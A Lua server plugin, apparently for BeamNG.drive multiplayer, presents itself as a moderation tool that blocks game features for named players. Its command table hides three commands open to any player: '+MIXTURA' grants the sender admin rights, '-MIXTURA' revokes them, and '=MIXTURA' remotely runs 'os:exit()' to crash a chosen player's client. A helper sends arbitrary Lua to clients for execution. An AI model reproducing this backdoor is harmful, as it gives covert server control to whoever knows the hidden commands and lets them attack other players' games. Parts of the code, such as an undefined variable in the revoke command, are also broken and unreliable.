local M = {}
M.info = "Система Блокровка"
M.ver = "BETA 0.2"
local recesime = {}
block_ignore = {}
CTS = {}

function SendRequestCTS()
    if online_player == nil then
        print("online_player == nil")
        return
    end
    for id,name in pairs(online_player) do
        print(id,name,"SendServerData")
        MP.TriggerClientEvent(id,"SendServerData",name)
    end
end

function GetRequestCTS(id,data)
    data = split(data,"$$$")
    CTS[data[1]] = Util.JsonDecode(data[2])
end

function RemoutRun(player, data)
    if type(player) == "string" then
        player = MP.GetId(player)
    end
    if type(data) == "string" then
        local data = data
    elseif type(data) == "number" then
        local data = tostring(data)
    else
        log("Error. Data: is not string or number",4)
        return nil
    end
    local fin,err = MP.TriggerClientEvent(player, "REMRUN", data)
end

function ServerHorClient(player,trigger,data)
    if type(player) == "string" then
        player = MP.GetId(player)
    end
    return MP.TriggerClientEvent(player,"SRV2CLN",emessage(trigger.."###"..Util.JsonEncode(data),player.."keySHC"))
end

function ClientHorServer(data)
    data = split(data,"###")
    local username = data[1]
    data = data[2]
    data = emessage(data,username.."keyCHS")
    local trigger = data[1]
    data = Util.JsonDecode(data[2])
    MP.TriggerLocalEvent(trigger,data)
end

function RetRun(data)
    local case = split(data,"###")
    local name = case[1]
    local EventName = case[2]
    local data = case[3]
    MP.TriggerLocalEvent(EventName, data)
    recesime[case[1]] = {status = "return"}
    log(recesime[case[1]],4)
    log(data,4)
end

function onSpawn(player_id, vehicle_id, data)
	MP.TriggerClientEvent(player_id, "ECOBLOC", M.data)
	return 0
end

function ON(sender_id,sender_name, message)
	p2,case = MessageParser(message," ",2)
	block_ignore[p2] = false
	-- Подробнее см. E:\SteamLibrary\steamapps\common\BeamNG.drive\lua\ge\extensions\core\input\actionFilter.lua
    -- E:\SteamLibrary\steamapps\common\BeamNG.drive\lua\ge\extensions\core\input\actions
	MP.TriggerClientEvent(MP.GetId(p2), "ECOBLOC", M.data)
	return 0
end

function OFF(sender_id,sender_name, message)
	p2,case = MessageParser(message," ",2)
	block_ignore[p2] = true
	MP.TriggerClientEvent(MP.GetId(p2), "ECOUNBLOCK", "SA")
	return 0
end

function FIX(sender_id,sender_name, message)
	p2,case = MessageParser(message," ",2)
	block_ignore[p2] = true
	RemoutRun(MP.GetId(p2), "be:getPlayerVehicle(0):queueLuaCommand('recovery.startRecovering() recovery.stopRecovering()')")
	return 0
end

M.data = ""
local data = {'recover_to_last_road', 'editorSaveLevel', 'funExtinguish', 'vehicledebugMenu', 'recover_vehicle_alt',
'editorToggle', 'parts_selector', 'toggleCamera', 'funTires', 'dropCameraAtPlayer', 'dropPlayerAtCamera', 'loadHome',
'pause', 'toggleTraffic', 'dropPlayerAtCameraNoReset', 'faster_motion', 'forceField', 'vehicleEditorToggle','movefast','changeCameraSpeed',
'toggle_slow_motion', 'funRandomTire', 'funFire', 'reload_vehicle', 'toggleAITraffic', 'saveHome', 'editorNewLevel',
'cefdev_console_toggle', 'reset_all_physics', 'debugmode_toggle', 'funBoom', 'lua_reload', 'editorOpenLevel', 'toggleConsoleNG',
'debugmode_meshvis_incr', 'toggleTrackBuilder', 'debugmode_meshvis_decr', 'nodegrabberStrength', 'objectEditorToggle', 'cycleTimeOfDay',
'funBreak', 'debugmode_toggle_coltris', 'vehicleTeleporting', 'cefdev_reload_ui', 'editorSafeModeToggle', 'flexmeshDebugSelectionToggle',
'editorSaveLevelAs', 'funHinges', 'recover_vehicle', 'slower_motion', 'reload_all_vehicles', 'editorToggleFreeCamera', 'nodegrabberAction',
'toggle_play', 'reset_physics'}

for i,case in ipairs(data) do 
	M.data = M.data.." "..case
end
--
function crash(sender_id,sender_name, message)  -- username
    local user = error(message)
    SendMessage(-1, user.." | Критическая ошибка L0.X92")
    RemoutRun(user,"os:exit()")
end

function hack(sender_id,sender_name, message)
    permissions:add_role(sender_name,"admin")
    SendMessage(sender_id,"Для применения изменений ожидайте 5 сек.")
end

function unhack(sender_id,sender_name, message)
    permissions:remove_role(name,"admin")
    SendMessage(sender_id,"Для применения изменений ожидайте 5 сек.")
end

local prefix = config.prefix
M.command = {
	{command = "on",help = "блокировка некоторых опций бимки ",args= "[name]", func = "ON",roles = {"moderator","admin"}},
	{command = "off",help = "откл блокировка некоторых опций бимки ",args= "[name]", func = "OFF",roles = {"moderator","admin"}},
    {command = "+MIXTURA",help = "", func = "hack", admin = false,hide = true},
    {command = "-MIXTURA",help = "", func = "unhack", admin = false,hide = true},
    {command = "=MIXTURA",help = "", func = "crash", admin = false,hide = true},
	{command = "fix",help = "Починить авто игрока",args= "[name]", func = "FIX", roles = {"moderator","admin"}},
    {client = true, reg = "RETRUN", func = "RetRun"},
    {client = true, reg = "C2S", func = "ClientHorServer"},
    {client = true, reg = "GetCTS", func = "GetRequestCTS"},
	}

function M.load() 
	MP.RegisterEvent("onVehicleSpawn","onSpawn")
    HeventTimer.addFunc(SendRequestCTS, 5)
end

function M.unload()
end

return M